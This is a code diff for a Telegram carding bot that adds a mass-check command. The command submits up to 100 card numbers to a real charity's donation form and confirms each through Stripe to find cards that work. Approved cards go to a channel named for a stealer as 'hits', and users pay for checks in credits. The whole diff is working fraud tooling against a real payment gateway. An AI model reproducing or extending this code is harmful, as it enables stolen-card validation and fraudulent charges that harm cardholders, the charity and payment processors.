@@ -9,6 +9,7 @@ from FUNC.usersdb_func import *
 from FUNC.defs import *
 from TOOLS.check_all_func import *
 from TOOLS.getbin import *
+from TOOLS.getcc_for_mass import *
 from BOT.tools.hit_stealer import send_hit_if_approved
 
 STEALER_CHANNEL_ID = -1003627495953
@@ -29,7 +30,6 @@ async def hiburma_check(fullcc):
     async with httpx.AsyncClient(timeout=120, follow_redirects=True) as s:
         headers = {"User-Agent": "Mozilla/5.0"}
 
-        # Step 1 — Get donation form tokens
         try:
             r = await s.get("https://www.hiburma.org/?givewp-route=donation-form-view&form-id=542&locale=en_GB", timeout=120)
             sig = re.search(r'givewp-route-signature=([a-f0-9]+)', r.text)
@@ -68,7 +68,6 @@ async def hiburma_check(fullcc):
             "originUrl": "https://www.hiburma.org/donate-us/"
         }
 
-        # Step 2 — Create donation and get client_secret
         try:
             r = await s.post(donate_url, data=donate_data, headers=headers, timeout=120)
             js = r.json()
@@ -77,7 +76,6 @@ async def hiburma_check(fullcc):
         except Exception as e:
             return "Error", f"Failed to get client_secret: {e}"
 
-        # Step 3 — Confirm payment with Stripe
         stripe_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
         stripe_headers = {
             "accept": "application/json",
@@ -116,6 +114,9 @@ async def hiburma_check(fullcc):
                 return res.get("status", "Unknown"), "Check manually"
         except Exception as e:
             return "Error", f"Stripe confirm failed: {e}"
+
+
+# ━━━━━━━━━━━━━━━━━━━━ SINGLE CHECK ━━━━━━━━━━━━━━━━━━━━
 
 @Client.on_message(filters.command("hb", [".", "/"]))
 async def hiburma_cmd(Client, message):
@@ -200,6 +201,88 @@ async def hiburma_cmd(Client, message):
         await deductcredit(user_id)
         if "Approved" in status:
             await send_hit_if_approved(Client, finalresp)
+
+    except Exception:
+        import traceback
+        await error_log(traceback.format_exc())
+
+
+# ━━━━━━━━━━━━━━━━━━━━ MASS CHECK ━━━━━━━━━━━━━━━━━━━━
+
+@Client.on_message(filters.command("mhb", [".", "/"]))
+async def mass_hiburma_cmd(Client, message):
+    try:
+        user_id = str(message.from_user.id)
+        first_name = str(message.from_user.first_name)
+        checkall = await check_all_thing(Client, message)
+
+        gateway = "HiBurma 1£ Charge"
+
+        if checkall[0] == False:
+            return
+
+        role = checkall[1]
+        getcc = await getcc_for_mass(message, role)
+        if getcc[0] == False:
+            await message.reply_text(getcc[1], message.id)
+            return
+
+        ccs = getcc[1]
+
+        if len(ccs) > 100:
+            await message.reply_text(f"✦ ᴍᴀx 100 ᴄᴄ ᴀʟʟᴏᴡᴇᴅ. ʏᴏᴜ ᴘʀᴏᴠɪᴅᴇᴅ {len(ccs)} ✦", message.id)
+            return
+
+        start = time.perf_counter()
+
+        text = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ʜɪʙᴜʀᴍᴀ</b> ✧
+━━━━━━━━━━━━━━━━━━━━
+[玄] 𝘾𝘾 𝘼𝙢𝙤𝙪𝙣𝙩 -» [{len(ccs)} / 100]
+[玄] 𝙎𝙩𝙖𝙩𝙪𝙨 -» Processing...
+━━━━━━━━━━━━━━━━━━━━
+
+"""
+        nov = await message.reply_text(text, message.id)
+
+        for i, fullcc in enumerate(ccs, 1):
+            status, response = await hiburma_check(fullcc)
+
+            cc_num = fullcc.split('|')[0]
+            getbin = await get_bin_details(cc_num)
+            brand = getbin[0] if len(getbin) > 0 else "Unknown"
+            type_ = getbin[1] if len(getbin) > 1 else "Unknown"
+            level = getbin[2] if len(getbin) > 2 else "Unknown"
+            bank = getbin[3] if len(getbin) > 3 else "Unknown"
+            country = getbin[4] if len(getbin) > 4 else "Unknown"
+            flag = getbin[5] if len(getbin) > 5 else ""
+
+            text += f"""[玄] 𝘾𝘾 -» <code>{fullcc}</code>
+[玄] 𝙎𝙩𝙖𝙩𝙪𝙨 -» {status}
+[玄] 𝙍𝙚𝙨𝙪𝙡𝙩 -» {response}
+
+[玄] 𝘽𝙞𝙣 -» {brand} — {type_} — {level}
+[玄] 𝘽𝙖𝙣𝙠 -» {bank}
+[玄] 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» {country} {flag}
+━━━━━━━━━━━━━━━━━━━━
+
+"""
+            try:
+                await Client.edit_message_text(message.chat.id, nov.id, text)
+            except:
+                pass
+
+            if "Approved" in status:
+                await send_hit_if_approved(Client, f"[玄] 𝘾𝘾 -» <code>{fullcc}</code>\n[玄] 𝙎𝙩𝙖𝙩𝙪𝙨 -» {status}\n[玄] 𝙂𝙖𝙩𝙚 -» {gateway}")
+
+            await asyncio.sleep(1)
+
+        text += f"""[玄] 𝙏𝙞𝙢𝙚 -» {time.perf_counter() - start:0.2f}s
+[玄] 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <a href='tg://user?id={message.from_user.id}'>{first_name}</a> ↯ {role}
+[玄] 𝙊𝙬𝙣𝙚𝙧 -» @pipin_o
+━━━━━━━━━━━━━━━━━━━━"""
+        await Client.edit_message_text(message.chat.id, nov.id, text)
+        await massdeductcredit(user_id, len(ccs))
+        await setantispamtime(user_id)
 
     except Exception:
         import traceback
